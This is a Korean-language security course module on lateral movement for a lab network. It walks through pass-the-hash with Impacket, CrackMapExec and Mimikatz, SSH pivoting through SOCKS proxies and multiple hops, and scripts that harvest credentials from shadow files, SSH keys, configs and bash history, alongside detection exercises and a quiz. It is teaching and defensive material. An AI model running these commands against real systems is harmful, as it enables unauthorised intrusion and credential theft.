# Week 08: 측면 이동 — Pass-the-Hash, WMI, PSExec, SSH 피봇

## 학습 목표
- **측면 이동(Lateral Movement)**의 개념과 APT 공격에서의 중요성을 이해한다
- **Pass-the-Hash(PtH)** 공격의 원리를 이해하고 NTLM 해시로 인증을 우회할 수 있다
- **WMI, PSExec, WinRM** 등 Windows 원격 실행 기법의 원리와 차이를 설명할 수 있다
- **SSH 피봇팅**으로 네트워크 세그먼트를 넘어 원격 호스트에 접근할 수 있다
- **프록시 체인**을 구성하여 다중 호스트를 경유하는 공격 경로를 구축할 수 있다
- 측면 이동의 탐지 기법(이벤트 로그, 네트워크 이상)을 이해하고 대응할 수 있다
- MITRE ATT&CK Lateral Movement 전술의 세부 기법을 매핑할 수 있다

## 전제 조건
- SSH 접속과 터널링(Week 03)에 대한 실습 경험이 있어야 한다
- NTLM 인증과 Kerberos 프로토콜(Week 05)을 이해하고 있어야 한다
- 네트워크 세그멘테이션 개념을 알고 있어야 한다
- Linux 및 Windows 원격 관리 도구 기본 개념을 알고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 (초기 접근점) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS (피봇 대상) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (1차 침투 대상) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (최종 목표) | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | 측면 이동 이론 + PtH/PtT 개념 | 강의 |
| 0:35-1:10 | Pass-the-Hash + Windows 기법 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | SSH 피봇팅 + 프록시 체인 실습 | 실습 |
| 1:55-2:30 | 다중 호스트 피봇 시나리오 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 측면 이동 탐지 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 측면 이동 이론 (35분)

## 1.1 측면 이동이란?

측면 이동(Lateral Movement)은 초기 침투 후 **네트워크 내부의 다른 시스템으로 이동**하는 기법이다. APT의 핵심 단계로, 최종 목표(도메인 컨트롤러, 데이터베이스 등)에 도달하기 위해 여러 시스템을 경유한다.

```
[측면 이동 시나리오]

인터넷 → [web 서버] → [내부 네트워크] → [DB 서버]
              ↓                              ↓
         초기 침투                        최종 목표
              ↓                              ↑
         권한 상승 → 크레덴셜 수집 → 측면 이동
```

### 측면 이동 기법 분류

| 기법 | 프로토콜 | 필요 조건 | OS | ATT&CK |
|------|---------|----------|-----|--------|
| **Pass-the-Hash** | NTLM | NTLM 해시 | Windows | T1550.002 |
| **Pass-the-Ticket** | Kerberos | TGT/TGS | Windows | T1550.003 |
| **PSExec** | SMB/RPC | 관리자 크레덴셜 | Windows | T1569.002 |
| **WMI** | DCOM/WMI | 관리자 크레덴셜 | Windows | T1047 |
| **WinRM** | HTTP/HTTPS | 관리자 크레덴셜 | Windows | T1021.006 |
| **RDP** | RDP(3389) | 유효한 크레덴셜 | Windows | T1021.001 |
| **SSH** | SSH(22) | 키/패스워드 | Linux | T1021.004 |
| **SSH 피봇** | SSH + SOCKS | SSH 접근 | Linux | T1090 |
| **SMB** | SMB(445) | 유효한 크레덴셜 | Both | T1021.002 |

## 1.2 Pass-the-Hash (PtH) 상세

PtH는 평문 비밀번호 없이 **NTLM 해시만으로 인증**하는 기법이다.

```
[정상 NTLM 인증]
클라이언트: 비밀번호 입력 → NTLM 해시 계산 → 챌린지 응답
서버: 챌린지 전송 → 응답 검증 → 인증 성공

[Pass-the-Hash]
공격자: 탈취한 NTLM 해시 → 챌린지 응답 (해시로 직접 계산)
서버: 챌린지 전송 → 응답 검증 → 인증 성공!
(서버는 해시에서 왔는지 비밀번호에서 왔는지 구별 불가)
```

### PtH 도구

| 도구 | 용도 | 명령 예시 |
|------|------|----------|
| **Impacket psexec** | SMB 원격 실행 | `psexec.py -hashes :NTLM user@target` |
| **Impacket wmiexec** | WMI 원격 실행 | `wmiexec.py -hashes :NTLM user@target` |
| **Impacket smbexec** | SMB 기반 실행 | `smbexec.py -hashes :NTLM user@target` |
| **CrackMapExec** | 다중 호스트 PtH | `cme smb targets -u user -H NTLM` |
| **Mimikatz** | PtH + 토큰 조작 | `sekurlsa::pth /user:admin /ntlm:HASH` |
| **Evil-WinRM** | WinRM PtH | `evil-winrm -i target -u user -H HASH` |

## 실습 1.1: Pass-the-Hash 시뮬레이션

> **실습 목적**: NTLM 해시를 이용한 Pass-the-Hash 공격의 전체 흐름을 시뮬레이션한다
>
> **배우는 것**: NTLM 해시 추출, PtH 인증, 원격 명령 실행의 전 과정을 이해한다
>
> **결과 해석**: NTLM 해시만으로 원격 시스템에 인증에 성공하면 PtH 공격이 성공한 것이다
>
> **실전 활용**: AD 환경 모의해킹에서 크레덴셜 재사용을 통한 측면 이동에 활용한다
>
> **명령어 해설**: Impacket의 psexec.py는 SMB를 통해 원격 명령을 실행하며 -hashes 옵션으로 PtH를 수행한다
>
> **트러블슈팅**: SMB 서명이 필수이면 PtH가 차단될 수 있다. 다른 프로토콜(WMI)로 전환한다

```bash
# Pass-the-Hash 시뮬레이션
python3 << 'PYEOF'
import hashlib

print("=== Pass-the-Hash 시뮬레이션 ===")
print()

# 1. NTLM 해시 생성 (시뮬레이션)
password = "P@ssw0rd123"
ntlm_hash = hashlib.new('md4', password.encode('utf-16-le')).hexdigest()
print(f"[1] 비밀번호: {password}")
print(f"    NTLM 해시: {ntlm_hash}")
print()

# 2. 해시 탈취 시나리오
print("[2] NTLM 해시 탈취 방법:")
print("  a) Mimikatz: sekurlsa::logonpasswords → 메모리에서 추출")
print("  b) SAM 파일: reg save HKLM\\SAM sam.hive → 오프라인 추출")
print("  c) NTDS.dit: DCSync → 도메인 전체 해시")
print("  d) Responder: LLMNR/NBT-NS 포이즈닝 → 네트워크 스니핑")
print()

# 3. PtH 실행
print("[3] Pass-the-Hash 명령 예시:")
print(f"  psexec.py -hashes :{ntlm_hash} administrator@10.20.30.80")
print(f"  wmiexec.py -hashes :{ntlm_hash} administrator@10.20.30.80")
print(f"  evil-winrm -i 10.20.30.80 -u administrator -H {ntlm_hash}")
print(f"  cme smb 10.20.30.0/24 -u administrator -H {ntlm_hash}")
print()

# 4. CrackMapExec 스프레이
print("[4] 해시 스프레이 (한 해시로 전체 네트워크 시도):")
hosts = ["10.20.30.1", "10.20.30.80", "10.20.30.100", "10.20.30.201"]
for h in hosts:
    print(f"  cme smb {h} -u administrator -H {ntlm_hash}")

print()
print("=== PtH 방어 ===")
print("1. Protected Users 그룹 사용 (NTLM 인증 비활성)")
print("2. Credential Guard 활성화 (메모리 보호)")
print("3. 로컬 관리자 계정 비활성화/랜덤화 (LAPS)")
print("4. SMB 서명 강제")
print("5. 네트워크 세그멘테이션")
PYEOF
```

---

# Part 2: SSH 피봇팅과 프록시 체인 (35분)

## 2.1 SSH 피봇팅 개요

SSH 피봇팅은 **SSH 연결을 통해 네트워크 경계를 넘어** 다른 네트워크의 호스트에 접근하는 기법이다.

```
[직접 접근 불가]
공격자(10.20.30.201) -X-> siem(10.20.30.100):9200
                          (방화벽이 차단)

[SSH 피봇팅]
공격자 → web(10.20.30.80) → siem(10.20.30.100):9200
              SSH 터널           내부 접근
```

### 피봇팅 유형

| 유형 | SSH 옵션 | 용도 | 예시 |
|------|---------|------|------|
| 로컬 포워딩 | `-L` | 특정 포트 접근 | `-L 9200:siem:9200` |
| 리모트 포워딩 | `-R` | 역방향 접근 | `-R 4444:localhost:4444` |
| 동적 포워딩 | `-D` | SOCKS 프록시 | `-D 1080` |
| ProxyJump | `-J` | 다중 호프 | `-J web@10.20.30.80` |

## 실습 2.1: SSH 로컬 포트 포워딩으로 피봇

> **실습 목적**: web 서버를 경유하여 직접 접근할 수 없는 내부 서비스에 접근한다
>
> **배우는 것**: SSH -L 옵션으로 포트를 포워딩하고, 피봇 호스트를 통해 내부 서비스에 접근하는 기법을 배운다
>
> **결과 해석**: 로컬 포트에서 원격 서비스의 응답이 오면 피봇 성공이다
>
> **실전 활용**: 침투 후 내부 네트워크의 데이터베이스, 관리 인터페이스 등에 접근하는 데 활용한다
>
> **명령어 해설**: -L 로컬포트:대상IP:대상포트 형태로 포워딩을 설정한다
>
> **트러블슈팅**: 포워딩이 안 되면 SSH 서버의 AllowTcpForwarding 설정을 확인한다

```bash
echo "=== SSH 피봇팅 실습 ==="

# 시나리오: opsclaw → web → siem의 SubAgent API에 접근
echo "[1] 직접 접근 테스트"
curl -s -o /dev/null -w "직접: HTTP %{http_code}\n" http://10.20.30.100:8002/ 2>/dev/null || echo "직접 접근: 실패/타임아웃"

echo ""
echo "[2] web 서버를 경유한 SSH 피봇"
# web을 통해 siem:8002에 접근
sshpass -p1 ssh -f -N -L 18002:10.20.30.100:8002 web@10.20.30.80 2>/dev/null
sleep 2

echo "[3] 피봇을 통한 접근"
curl -s -o /dev/null -w "피봇 경유: HTTP %{http_code}\n" http://localhost:18002/ 2>/dev/null

# 정리
kill $(pgrep -f "ssh.*18002:10.20.30.100:8002" 2>/dev/null) 2>/dev/null
echo "[SSH 피봇 정리 완료]"
```

## 실습 2.2: SOCKS 프록시를 이용한 전체 네트워크 접근

> **실습 목적**: SSH 동적 포워딩으로 SOCKS 프록시를 구성하여 내부 네트워크 전체에 접근한다
>
> **배우는 것**: -D 옵션으로 SOCKS 프록시를 구성하고 proxychains로 도구를 연결하는 방법을 배운다
>
> **결과 해석**: proxychains/curl --socks5를 통해 여러 내부 호스트에 접근하면 성공이다
>
> **실전 활용**: 단일 피봇으로 내부 네트워크 전체를 스캔하고 공격하는 데 활용한다
>
> **명령어 해설**: -D 1080은 SOCKS5 프록시를 생성하며, 모든 TCP 연결을 피봇 호스트를 통해 전달한다
>
> **트러블슈팅**: SOCKS 프록시가 느리면 -o ServerAliveInterval=60을 추가한다

```bash
echo "=== SOCKS 프록시 피봇 ==="

# web 서버를 SOCKS 프록시로 구성
sshpass -p1 ssh -f -N -D 1080 web@10.20.30.80 2>/dev/null
sleep 2

echo "[1] SOCKS 프록시를 통한 내부 스캔"
for host in 10.20.30.1 10.20.30.80 10.20.30.100; do
  RESULT=$(curl -s --socks5 localhost:1080 -o /dev/null -w "%{http_code}" "http://$host:8002/" --max-time 5 2>/dev/null)
  echo "  $host:8002 → HTTP $RESULT"
done

echo ""
echo "[2] SOCKS 프록시를 통한 서비스 접근"
curl -s --socks5 localhost:1080 http://10.20.30.100:8002/ 2>/dev/null | head -3

# 정리
kill $(pgrep -f "ssh.*-D 1080" 2>/dev/null) 2>/dev/null
echo ""
echo "[SOCKS 프록시 정리 완료]"
```

## 실습 2.3: 다중 호프 피봇

> **실습 목적**: 여러 서버를 순차적으로 경유하는 다중 호프 피봇을 구성한다
>
> **배우는 것**: SSH ProxyJump(-J), 중첩 터널, 다중 SOCKS 프록시 체인을 배운다
>
> **결과 해석**: 2개 이상의 호스트를 경유하여 최종 대상에 접근하면 성공이다
>
> **실전 활용**: 실제 APT는 5~10개 호스트를 경유하여 추적을 어렵게 한다
>
> **명령어 해설**: -J는 ProxyJump로, 중간 호스트를 자동으로 경유하여 최종 대상에 SSH 접속한다
>
> **트러블슈팅**: ProxyJump가 지원되지 않는 구버전에서는 -o ProxyCommand를 사용한다

```bash
echo "=== 다중 호프 피봇 ==="

# 시나리오: opsclaw → web → secu → siem
echo "[경로] opsclaw → web(10.20.30.80) → secu(10.20.30.1)"

# ProxyJump를 이용한 다중 호프
echo ""
echo "[1] ProxyJump (-J) 사용"
sshpass -p1 ssh -J web@10.20.30.80 -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "echo '성공: $(hostname) ($(id))'" 2>/dev/null || echo "ProxyJump 실패 (sshpass 호환 문제)"

echo ""
echo "[2] 수동 중첩 터널"
# 1차 터널: opsclaw → web → secu:22 를 로컬 12222로
sshpass -p1 ssh -f -N -L 12222:10.20.30.1:22 web@10.20.30.80 2>/dev/null
sleep 1

# 2차 접속: 로컬 12222 (= secu) 에 SSH
sshpass -p1 ssh -p 12222 -o StrictHostKeyChecking=no secu@localhost \
  "echo '2-hop 피봇 성공: $(hostname)'" 2>/dev/null || echo "2-hop 피봇 실패"

# 정리
kill $(pgrep -f "ssh.*12222:10.20.30.1" 2>/dev/null) 2>/dev/null
echo "[다중 호프 정리 완료]"
```

---

# Part 3: 크레덴셜 수집과 측면 이동 체인 (35분)

## 3.1 크레덴셜 수집 기법

측면 이동의 전제는 **유효한 크레덴셜 확보**이다.

| 기법 | 대상 | 도구 | ATT&CK |
|------|------|------|--------|
| 메모리 덤프 | LSASS 프로세스 | Mimikatz, procdump | T1003.001 |
| SAM 파일 | 로컬 계정 해시 | reg save, secretsdump | T1003.002 |
| NTDS.dit | 도메인 전체 해시 | DCSync, ntdsutil | T1003.003 |
| Linux shadow | /etc/shadow | cat, 권한 상승 | T1003.008 |
| SSH 키 | ~/.ssh/ | find, cat | T1552.004 |
| 브라우저 저장 | Chrome/Firefox | LaZagne, SharpChromium | T1555.003 |
| 키체인 | macOS Keychain | security dump | T1555.001 |

## 실습 3.1: Linux 크레덴셜 수집

> **실습 목적**: Linux 시스템에서 측면 이동에 사용할 수 있는 크레덴셜을 수집한다
>
> **배우는 것**: /etc/shadow, SSH 키, 설정 파일 등에서 크레덴셜을 추출하는 기법을 배운다
>
> **결과 해석**: 유효한 비밀번호 해시나 SSH 키를 발견하면 크레덴셜 수집 성공이다
>
> **실전 활용**: 침투한 호스트에서 다른 호스트로 이동하기 위한 크레덴셜을 확보한다
>
> **명령어 해설**: find와 grep으로 시스템 전체에서 크레덴셜 관련 파일을 검색한다
>
> **트러블슈팅**: 권한이 부족하면 먼저 권한 상승(Week 06)을 수행한다

```bash
echo "=== Linux 크레덴셜 수집 ==="

echo ""
echo "[1] /etc/shadow (root 필요)"
echo 1 | sudo -S cat /etc/shadow 2>/dev/null | grep -v ":\*:\|:!:" || echo "읽기 불가"

echo ""
echo "[2] SSH 키 검색"
find /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

echo ""
echo "[3] SSH known_hosts (피봇 대상 식별)"
for user_dir in /home/* /root; do
  if [ -f "$user_dir/.ssh/known_hosts" ]; then
    echo "  [$user_dir/.ssh/known_hosts]"
    cat "$user_dir/.ssh/known_hosts" 2>/dev/null | head -5
  fi
done

echo ""
echo "[4] SSH authorized_keys (접근 가능 키 확인)"
for user_dir in /home/* /root; do
  if [ -f "$user_dir/.ssh/authorized_keys" ]; then
    echo "  [$user_dir/.ssh/authorized_keys]"
    cat "$user_dir/.ssh/authorized_keys" 2>/dev/null | head -3
  fi
done

echo ""
echo "[5] 설정 파일에서 비밀번호 검색"
grep -r "password\|passwd\|secret\|token" /etc/*.conf 2>/dev/null | head -5
grep -r "password\|passwd" /opt/ 2>/dev/null | head -5

echo ""
echo "[6] 히스토리에서 크레덴셜"
for user_dir in /home/* /root; do
  HIST="$user_dir/.bash_history"
  if [ -f "$HIST" ]; then
    grep -i "ssh\|sshpass\|mysql.*-p\|psql.*-W\|curl.*-u" "$HIST" 2>/dev/null | head -3
  fi
done
```

## 실습 3.2: 원격 서버 크레덴셜 수집

> **실습 목적**: 피봇을 통해 접근한 원격 서버에서도 크레덴셜을 수집한다
>
> **배우는 것**: SSH를 통한 원격 크레덴셜 수집과 수집 결과의 활용을 배운다
>
> **결과 해석**: 각 서버에서 유효한 크레덴셜을 발견하면 추가 측면 이동이 가능하다
>
> **실전 활용**: 측면 이동 시 각 호스트에서 추가 크레덴셜을 수집하여 공격 범위를 확대한다
>
> **명령어 해설**: SSH로 원격 서버에 크레덴셜 수집 명령을 전달한다
>
> **트러블슈팅**: 원격 서버에 접근이 안 되면 피봇 경로를 확인한다

```bash
# 각 서버에서 크레덴셜 수집
for SERVER in "web@10.20.30.80" "secu@10.20.30.1" "siem@10.20.30.100"; do
  NAME=$(echo "$SERVER" | cut -d'@' -f1)
  echo "============================================"
  echo "  $NAME 크레덴셜 수집"
  echo "============================================"

  sshpass -p1 ssh -o StrictHostKeyChecking=no "$SERVER" "
    echo '--- SSH 키 ---'
    find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
    echo '--- 설정 파일 비밀번호 ---'
    grep -r 'password\|passwd' /etc/*.conf 2>/dev/null | grep -v '#' | head -3
    echo '--- .env 파일 ---'
    find / -name '.env' -type f 2>/dev/null | head -5
    echo '--- SSH 접속 이력 ---'
    grep 'ssh\|sshpass' ~/.bash_history 2>/dev/null | tail -3
  " 2>/dev/null || echo "  접속 실패"
  echo ""
done
```

---

# Part 4: 측면 이동 탐지와 종합 시나리오 (35분)

## 4.1 측면 이동 탐지

| 탐지 소스 | 지표 | 탐지 방법 |
|----------|------|----------|
| Windows 이벤트 | 4624 (로그인) | 비정상 시간/소스 로그인 |
| Windows 이벤트 | 4648 (명시적 크레덴셜) | PtH 시도 |
| Windows 이벤트 | 5140/5145 (SMB 접근) | 네트워크 공유 접근 |
| Syslog | SSH 로그인 | 비정상 소스 IP |
| 네트워크 | SMB/RPC 트래픽 | 비정상 통신 패턴 |
| 네트워크 | 내부 스캔 | 포트 스캔 감지 |
| EDR | 프로세스 생성 | PSExec, WMI 프로세스 |
| Wazuh | 파일 무결성 | 중요 파일 변경 |

## 실습 4.1: 측면 이동 탐지 모니터링

> **실습 목적**: 측면 이동 시도가 보안 장비에 어떻게 기록되는지 확인한다
>
> **배우는 것**: SSH 로그인 로그, Wazuh 알림, 네트워크 트래픽에서 측면 이동을 탐지하는 방법을 배운다
>
> **결과 해석**: 비정상 SSH 로그인, 내부 스캔 알림이 발생하면 측면 이동이 탐지된 것이다
>
> **실전 활용**: Blue Team이 측면 이동을 실시간 모니터링하고 차단하는 데 활용한다
>
> **명령어 해설**: auth.log, Wazuh 알림, Suricata 로그에서 측면 이동 지표를 검색한다
>
> **트러블슈팅**: 로그가 없으면 로깅 설정을 확인한다

```bash
echo "=== 측면 이동 탐지 모니터링 ==="

echo ""
echo "[1] SSH 로그인 기록 (web 서버)"
sshpass -p1 ssh web@10.20.30.80 \
  "grep 'Accepted\|Failed' /var/log/auth.log 2>/dev/null | tail -10 || echo 'auth.log 없음'" 2>/dev/null

echo ""
echo "[2] Wazuh 알림 (측면 이동 관련)"
sshpass -p1 ssh siem@10.20.30.100 \
  "grep -i 'lateral\|ssh.*accepted\|authentication' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -5 | python3 -c '
import sys,json
for line in sys.stdin:
    try:
        d=json.loads(line)
        print(f\"  [{d.get(\"rule\",{}).get(\"level\")}] {d.get(\"rule\",{}).get(\"description\",\"?\")[:60]}\")
    except: pass' 2>/dev/null || echo '  알림 없음'" 2>/dev/null

echo ""
echo "[3] 네트워크 이상 탐지 (Suricata)"
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -10 /var/log/suricata/fast.log 2>/dev/null | grep -i 'lateral\|smb\|ssh\|scan' || echo '  관련 알림 없음'" 2>/dev/null
```

## 실습 4.2: 종합 측면 이동 시나리오

> **실습 목적**: 초기 접근에서 최종 목표까지 전체 측면 이동 경로를 실행한다
>
> **배우는 것**: 크레덴셜 수집 → 피봇 → 정보 수집 → 다음 호프의 반복 과정을 배운다
>
> **결과 해석**: 전체 내부 네트워크에 접근하고 최종 목표(SIEM 데이터)에 도달하면 성공이다
>
> **실전 활용**: 모의해킹의 측면 이동 단계 전체 플로우에 활용한다
>
> **명령어 해설**: SSH를 기반으로 각 서버를 순차적으로 접근하고 정보를 수집한다
>
> **트러블슈팅**: 특정 호프에서 접근이 실패하면 대안 경로를 탐색한다

```bash
echo "============================================================"
echo "       종합 측면 이동 시나리오                                 "
echo "============================================================"

echo ""
echo "[Phase 1] 초기 접근 — web 서버"
echo "  공격자(opsclaw) → web(10.20.30.80) via SSH"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo '[+] web 접근 성공: $(hostname) ($(whoami))'; echo '    내부 네트워크: $(ip addr show | grep 'inet 10' | awk '{print \$2}' | head -1)'" 2>/dev/null

echo ""
echo "[Phase 2] 크레덴셜 수집 — web에서 정보 추출"
sshpass -p1 ssh web@10.20.30.80 \
  "echo '--- 네트워크 이웃 ---'; ip neigh 2>/dev/null | head -5; echo '--- SSH 접속 이력 ---'; grep 'ssh' ~/.bash_history 2>/dev/null | tail -3" 2>/dev/null

echo ""
echo "[Phase 3] 피봇 — web → secu"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
    'echo \"[+] secu 접근 성공: \$(hostname) (\$(whoami))\"; echo \"    방화벽 규칙 수: \$(echo 1 | sudo -S nft list ruleset 2>/dev/null | wc -l)\"' 2>/dev/null" 2>/dev/null || echo "web→secu 피봇 실패"

echo ""
echo "[Phase 4] 피봇 — web → siem"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
    'echo \"[+] siem 접근 성공: \$(hostname) (\$(whoami))\"; echo \"    Wazuh 알림 수: \$(wc -l < /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo N/A)\"' 2>/dev/null" 2>/dev/null || echo "web→siem 피봇 실패"

echo ""
echo "[Phase 5] 최종 목표 — SIEM 데이터 접근"
sshpass -p1 ssh web@10.20.30.80 \
  "sshpass -p1 ssh siem@10.20.30.100 \
    'echo \"--- SIEM 최근 알림 (Top 3) ---\"; tail -3 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
import sys,json
for l in sys.stdin:
    try:
        d=json.loads(l); print(f\\\"  {d.get(\\\\\"rule\\\\\",{}).get(\\\\\"description\\\\\",\\\\\"?\\\\\")[:60]}\\\")
    except: pass\" 2>/dev/null' 2>/dev/null" 2>/dev/null || echo "데이터 접근 실패"

echo ""
echo "============================================================"
echo "  경로: opsclaw → web → secu/siem (2-hop 피봇 완료)         "
echo "============================================================"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | PtH 원리 이해 | 구두 설명 | NTLM 해시 인증 설명 |
| 2 | NTLM 해시 생성 | Python | 해시 계산 성공 |
| 3 | SSH 로컬 포워딩 | ssh -L | 원격 서비스 접근 |
| 4 | SOCKS 프록시 | ssh -D | 다중 호스트 접근 |
| 5 | 다중 호프 피봇 | 중첩 터널 | 2-hop 접근 성공 |
| 6 | 크레덴셜 수집 | grep/find | SSH키/해시 발견 |
| 7 | 원격 크레덴셜 | SSH 전달 | 3개 서버 수집 |
| 8 | 로그 탐지 | auth.log | SSH 로그인 기록 |
| 9 | Wazuh 탐지 | alerts.json | 관련 알림 확인 |
| 10 | 종합 시나리오 | 전체 실행 | 5 Phase 완료 |

---

## 자가 점검 퀴즈

**Q1.** Pass-the-Hash가 가능한 근본적 이유는?

<details><summary>정답</summary>
NTLM 인증에서 서버는 클라이언트가 비밀번호에서 해시를 계산했는지, 이미 가진 해시를 사용했는지 구별할 수 없다. 챌린지-응답 과정에서 해시만 사용되므로, 해시를 알면 비밀번호 없이도 인증이 가능하다.
</details>

**Q2.** PSExec과 WMI를 이용한 측면 이동의 차이점은?

<details><summary>정답</summary>
PSExec은 SMB(445)를 통해 서비스를 생성하여 명령을 실행하며, 대상에 바이너리를 업로드한다. WMI는 DCOM(135)을 통해 WMI 인터페이스로 명령을 실행하며, 파일 업로드가 불필요하다. PSExec은 더 안정적이지만 탐지가 쉽고, WMI는 은밀하지만 출력 회수가 복잡하다.
</details>

**Q3.** SSH 동적 포워딩(-D)이 로컬 포워딩(-L)보다 유리한 상황은?

<details><summary>정답</summary>
내부 네트워크의 여러 호스트/포트에 접근해야 할 때이다. -L은 하나의 목적지만 포워딩하므로 각 서비스마다 별도 터널이 필요하지만, -D는 SOCKS 프록시를 생성하여 단일 터널로 내부 네트워크의 모든 호스트에 접근할 수 있다.
</details>

**Q4.** 측면 이동을 탐지하기 위해 모니터링해야 하는 Windows 이벤트 ID 3가지는?

<details><summary>정답</summary>
1. Event ID 4624 (Type 3, Network): 네트워크 로그인 - 비정상 소스 IP 확인
2. Event ID 4648: 명시적 크레덴셜 사용 - PtH/PtT 의심
3. Event ID 5140: 네트워크 공유 접근 - PSExec 등 SMB 기반 측면 이동
</details>

**Q5.** SSH ProxyJump(-J)와 수동 중첩 터널의 차이는?

<details><summary>정답</summary>
ProxyJump(-J)는 SSH 클라이언트가 자동으로 중간 호스트를 경유하여 최종 대상에 연결하며, 단일 명령으로 구성된다. 수동 중첩 터널은 각 호프마다 별도 SSH 연결을 설정해야 하므로 복잡하지만, 더 세밀한 제어가 가능하다. ProxyJump는 SSH 7.3+ 이상에서 지원된다.
</details>

**Q6.** 크레덴셜 수집에서 .bash_history가 중요한 이유는?

<details><summary>정답</summary>
사용자가 입력한 SSH 접속 명령(sshpass -p, ssh -i), 데이터베이스 접속 명령(mysql -p, psql -W), curl 인증(-u user:pass) 등이 기록되어 있을 수 있다. 이를 통해 다른 호스트의 크레덴셜, 내부 서비스 위치, 접근 패턴을 파악할 수 있다.
</details>

**Q7.** 네트워크 세그멘테이션이 측면 이동을 방해하는 원리는?

<details><summary>정답</summary>
네트워크를 논리적 구역(VLAN, 서브넷)으로 분리하고 구역 간 트래픽을 방화벽으로 제한하면, 공격자가 한 구역을 침투해도 다른 구역에 직접 접근할 수 없다. 측면 이동을 위해 방화벽을 우회하거나 허용된 경로를 찾아야 하므로 공격 난이도가 높아진다.
</details>

**Q8.** Mimikatz로 LSASS에서 크레덴셜을 추출하는 과정을 설명하라.

<details><summary>정답</summary>
1. 관리자 권한 획득 (privilege::debug)
2. LSASS(Local Security Authority Subsystem Service) 프로세스 메모리 접근
3. sekurlsa::logonpasswords로 메모리에 캐시된 NTLM 해시, Kerberos 티켓, 평문 비밀번호(wdigest) 추출
4. 추출된 크레덴셜로 PtH/PtT 수행
</details>

**Q9.** CrackMapExec(CME)으로 해시 스프레이를 수행하는 방법과 목적은?

<details><summary>정답</summary>
`cme smb 10.20.30.0/24 -u administrator -H NTLM_HASH`로 하나의 NTLM 해시를 네트워크 전체 호스트에 시도한다. 목적: 로컬 관리자 비밀번호가 동일한(재사용된) 호스트를 찾는 것이다. 많은 조직에서 이미지 배포 시 동일한 로컬 관리자 비밀번호를 설정하므로 효과적이다.
</details>

**Q10.** 실습 환경에서 opsclaw→siem에 도달하는 최적 측면 이동 경로는?

<details><summary>정답</summary>
opsclaw(10.20.30.201) → SSH → web(10.20.30.80) → SSH 피봇(-L 또는 -D) → siem(10.20.30.100). web은 모든 내부 호스트에 접근 가능한 위치에 있으므로 최적의 피봇 포인트이다. 크레덴셜은 sshpass -p1 (비밀번호: 1)로 모든 서버에 접근 가능하다.
</details>

---

## 과제

### 과제 1: 측면 이동 맵 작성 (개인)
실습 환경(10.20.30.0/24)의 전체 측면 이동 가능 경로를 네트워크 다이어그램으로 작성하라. 각 경로의 필요 크레덴셜, 사용 프로토콜, 탐지 가능성을 표시할 것.

### 과제 2: 피봇 자동화 스크립트 (팀)
SSH 피봇팅을 자동화하는 스크립트를 작성하라. 입력: 호프 목록(A→B→C→D), 출력: 자동 터널 설정 및 SOCKS 프록시 구성. 정리 기능도 포함할 것.

### 과제 3: 측면 이동 탐지 대시보드 (팀)
Wazuh 알림과 SSH 로그를 분석하여 측면 이동을 실시간 탐지하는 모니터링 방안을 설계하라. 탐지 규칙, 알림 조건, 대응 절차를 포함할 것.
